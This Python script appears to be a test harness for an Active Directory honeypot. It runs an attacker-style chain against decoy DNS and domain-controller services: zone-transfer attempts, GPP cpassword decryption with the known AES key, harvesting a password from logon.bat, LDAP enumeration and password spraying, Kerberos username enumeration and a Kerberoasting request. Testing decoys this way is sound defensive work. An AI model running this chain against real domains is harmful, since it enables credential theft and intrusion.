"""Attacker-side DC/DNS chain (runs inside the rpot image: impacket + rpot.ber available).

  DNS:  version.bind, A dc01, SRV _ldap, AXFR (refused)
  SMB:  \\\\DC\\SYSVOL → Groups.xml → gpp-decrypt cpassword ; \\\\DC\\NETLOGON\\logon.bat → svc_print password
  LDAP: rootDSE, anonymous search (000004DC), simple bind svc_print (honeytoken, L5) → search SPN users,
        password spraying (one password, several accounts)
  KRB:  AS-REQ for a real user (25 → 24), unknown user (6), TGS-REQ for the honey SPN (Kerberoasting)
In the CE 3-decoy lab the DC is also the DNS server (no separate DNS decoy): omit --dns.
Usage: dc_attack_sim.py --dc IP [--dns IP] --domain corp.x.am [--dc-name DC01]
"""
import argparse
import base64
import io
import re
import socket
import struct
import sys
import time

from rpot.sensor.services import ber as B
from rpot.sensor.services.kerberos import principal

ap = argparse.ArgumentParser()
ap.add_argument("--dc", required=True)
ap.add_argument("--dns")
ap.add_argument("--domain", required=True)
ap.add_argument("--dc-name", default="dc01", help="host name of the DC decoy (default dc01)")
ap.add_argument("--pause", type=float, default=0)
a = ap.parse_args()
dom, realm, dns_ip = a.domain, a.domain.upper(), a.dns or a.dc
ok = True


def step(t):
    print(f"\n== {t}", flush=True)
    time.sleep(a.pause)


def check(cond, msg):
    global ok
    print(("  [ok] " if cond else "  [FAIL] ") + msg, flush=True)
    ok &= bool(cond)


def dnsq(name, qtype=1, qclass=1, tcp=False):
    q = struct.pack(">HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0) + b"".join(
        bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00" + struct.pack(">HH", qtype, qclass)
    if tcp:
        s = socket.create_connection((dns_ip, 53), 5)
        s.sendall(struct.pack(">H", len(q)) + q)
        n = struct.unpack(">H", s.recv(2))[0]
        r = s.recv(n)
        s.close()
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(q, (dns_ip, 53))
        r = s.recv(4096)
    return r[3] & 0x0F, struct.unpack(">H", r[6:8])[0], r


step(f"DNS recon against {dns_ip}")
rc, an, r = dnsq("version.bind", 16, 3)
if dns_ip == a.dc:                                    # the DC runs Microsoft DNS: no version.bind
    check(rc == 5 and b"9.18" not in r, "version.bind REFUSED (Microsoft DNS persona)")
else:
    check(rc == 0 and b"9.18" in r, "version.bind answered (BIND fingerprint)")
rc, an, r = dnsq(f"{a.dc_name.lower()}.{dom}")
check(rc == 0 and an == 1, f"{a.dc_name.lower()}.{dom} resolves → {'.'.join(map(str, r[-4:]))}")
rc, an, r = dnsq(f"_ldap._tcp.dc._msdcs.{dom}", 33)
check(rc == 0 and an == 1, "SRV _ldap._tcp.dc._msdcs found")
rc, an, r = dnsq(dom, 252, tcp=True)
check(rc == 5, "AXFR refused")
rc, an, r = dnsq("www.google.com")
check(rc == 5, "external name refused (no open resolver)")

step(f"SMB SYSVOL / NETLOGON on {a.dc}")
from impacket.smbconnection import SMBConnection
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
c = SMBConnection(a.dc, a.dc, sess_port=445, timeout=10)
c.login("", "")
shares = [s["shi1_netname"][:-1] for s in c.listShares()]
check("SYSVOL" in shares and "NETLOGON" in shares, f"shares: {shares}")
buf = io.BytesIO()
path = None
stack = [f"{dom}\\Policies"]
while stack and not path:
    d = stack.pop()
    for f in c.listPath("SYSVOL", d + "\\*"):
        n = f.get_longname()
        if n in (".", ".."):
            continue
        if f.is_directory():
            stack.append(d + "\\" + n)
        elif n == "Groups.xml":
            path = d + "\\" + n
check(path, f"found {path}")
c.getFile("SYSVOL", path, buf.write)
xml = buf.getvalue().decode()
cp = re.search(r'cpassword="([^"]+)"', xml).group(1)
user = re.search(r'newName="([^"]+)"', xml).group(1)
cp += "=" * (-len(cp) % 4)
key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
pt = Cipher(algorithms.AES(key), modes.CBC(b"\0" * 16)).decryptor().update(base64.b64decode(cp))
gpp_pw = pt[:-pt[-1]].decode("utf-16-le")
check(gpp_pw, f"gpp-decrypt → {user} / {gpp_pw}")
buf = io.BytesIO()
c.getFile("NETLOGON", "logon.bat", buf.write)
m = re.search(r"/user:\S+\\(\S+) (\S+)", buf.getvalue().decode())
print_user, print_pw = m.group(1), m.group(2)
check(print_pw, f"logon.bat → {print_user} / {print_pw}")
c.close()


def ldap(sock, op):
    global mid
    mid += 1
    sock.sendall(B.seq(B.integer(mid), op))
    out = []
    while True:
        hdr = sock.recv(2)
        n = hdr[1]
        extra = b""
        if n & 0x80:
            extra = sock.recv(n & 0x7F)
            n = int.from_bytes(extra, "big")
        body = b""
        while len(body) < n:
            body += sock.recv(n - len(body))
        tag, msg = B.one(hdr + extra + body)
        out.append(msg[1])
        if msg[1][0] in (0x61, 0x65, 0x78):
            return out


mid = 0
step(f"LDAP on {a.dc}")
s = socket.create_connection((a.dc, 389), 10)
search = lambda base, scope, flt, attrs: B.app(3, B.octets(base) + B.enum(scope) + B.enum(0) + B.integer(0) + B.integer(0)
                                              + B.tlv(0x01, b"\x00") + flt + B.seq(*[B.octets(x) for x in attrs]))
present = lambda attr: B.tlv(0x87, attr.encode())
r = ldap(s, search("", 0, present("objectClass"), ["defaultNamingContext", "dnsHostName"]))
def attrs_of(ent):
    return {B.as_str(x[1][0][1]): [B.as_str(v) for _, v in x[1][1][1]] for x in ent[1][1]}


check(r[0][0] == 0x64, "rootDSE: " + ", ".join(f"{k}={v[0]}" for k, v in attrs_of(r[0][1]).items()))
r = ldap(s, search(",".join(f"DC={x}" for x in dom.split(".")), 2, present("objectClass"), ["sAMAccountName"]))
check(B.as_int(r[-1][1][0][1]) == 1 and b"000004DC" in r[-1][1][2][1], "anonymous search → 000004DC")
r = ldap(s, B.app(0, B.integer(3) + B.octets(f"{realm.split('.')[0]}\\{print_user}") + B.tlv(0x80, print_pw.encode())))
check(B.as_int(r[0][1][0][1]) == 0, f"simple bind as {print_user} with the logon.bat password: success")
spn_f = B.tlv(0xA0, present("servicePrincipalName") + B.tlv(0xA3, B.octets("objectClass") + B.octets("user")))
r = ldap(s, search(",".join(f"DC={x}" for x in dom.split(".")), 2, spn_f, ["sAMAccountName", "servicePrincipalName", "description"]))
spns = {}
for tag, ent in r:
    if tag == 0x64:
        attrs = attrs_of(ent)
        spns[attrs["sAMAccountName"][0]] = (attrs.get("servicePrincipalName", [""])[0], attrs.get("description", [""])[0])
check("svc_sql" in spns, f"Kerberoastable users: {spns}")
s.close()

step(f"LDAP password spraying on {a.dc} (one seasonal password, several accounts)")
spray_users = ["administrator", "svc_sql", "svc_backup", "helpdesk", "guest"]
fails = 0
for u in spray_users:
    s = socket.create_connection((a.dc, 389), 10)
    r = ldap(s, B.app(0, B.integer(3) + B.octets(f"{realm.split('.')[0]}\\{u}") + B.tlv(0x80, b"Winter2026!")))
    fails += B.as_int(r[0][1][0][1]) == 49
    s.close()
check(fails == len(spray_users), f"spray: {fails}/{len(spray_users)} binds rejected with invalidCredentials (49)")

step(f"Kerberos on {a.dc}")


def kdc(req):
    k = socket.create_connection((a.dc, 88), 10)
    k.sendall(len(req).to_bytes(4, "big") + req)
    n = int.from_bytes(k.recv(4), "big")
    body = b""
    while len(body) < n:
        body += k.recv(n - len(body))
    k.close()
    tag, v = B.one(body)
    return B.as_int(B.find(v[0][1], 0xA6)[0][1])


def as_req(user, preauth=False):
    pa = B.ctx(3, B.seq(B.seq(B.ctx(1, B.integer(2)), B.ctx(2, B.octets(b"\x30\x00"))))) if preauth else b""
    body = B.seq(B.ctx(0, B.tlv(0x03, b"\x00\x40\x81\x00\x10")), B.ctx(1, principal(1, user)), B.ctx(2, B.gstring(realm)),
                 B.ctx(3, principal(2, "krbtgt", realm)), B.ctx(7, B.integer(12345)), B.ctx(8, B.seq(B.integer(18), B.integer(23))))
    return B.app(10, B.seq(B.ctx(1, B.integer(5)), B.ctx(2, B.integer(10)), pa, B.ctx(4, body)))


check(kdc(as_req("no.such.user")) == 6, "unknown user → KDC_ERR_C_PRINCIPAL_UNKNOWN (6)")
check(kdc(as_req(print_user)) == 25, f"{print_user} → PREAUTH_REQUIRED (25): valid username")
check(kdc(as_req(print_user, preauth=True)) == 24, "pre-auth guess → PREAUTH_FAILED (24)")
spn = spns.get("svc_sql", ("MSSQLSvc/sql01:1433", ""))[0]
tgs = B.app(12, B.seq(B.ctx(1, B.integer(5)), B.ctx(2, B.integer(12)),
                      B.ctx(4, B.seq(B.ctx(0, B.tlv(0x03, b"\x00\x40\x81\x00\x10")), B.ctx(2, B.gstring(realm)),
                                     B.ctx(3, principal(2, *spn.split("/", 1)))))))
check(kdc(tgs) == 41, f"TGS-REQ for {spn} (Kerberoast) answered")
print("\nRESULT:", "ALL OK" if ok else "FAILURES")
sys.exit(0 if ok else 1)
